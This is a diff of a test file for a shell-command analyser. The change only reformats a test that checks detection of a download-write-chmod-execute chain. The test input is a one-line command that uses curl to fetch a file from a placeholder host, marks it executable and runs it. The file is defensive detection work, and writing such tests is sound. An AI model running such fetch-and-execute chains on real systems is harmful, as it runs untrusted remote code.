@@ -41,14 +41,11 @@ describe("analyseShellCommand", () => {
 
   it("detects download write chmod execute", () => {
     const result = analyseShellCommand({
-      command:
-        "curl -o /tmp/a https://example.invalid/a && chmod +x /tmp/a && /tmp/a",
+      command: "curl -o /tmp/a https://example.invalid/a && chmod +x /tmp/a && /tmp/a",
       sourceLocation: loc,
       executionSink: "execSync",
     });
-    expect(result.chainHints.some((h) => h.type === "DOWNLOAD_WRITE_EXECUTE")).toBe(
-      true,
-    );
+    expect(result.chainHints.some((h) => h.type === "DOWNLOAD_WRITE_EXECUTE")).toBe(true);
   });
 
   it("does not treat curl --version as a remote download chain", () => {
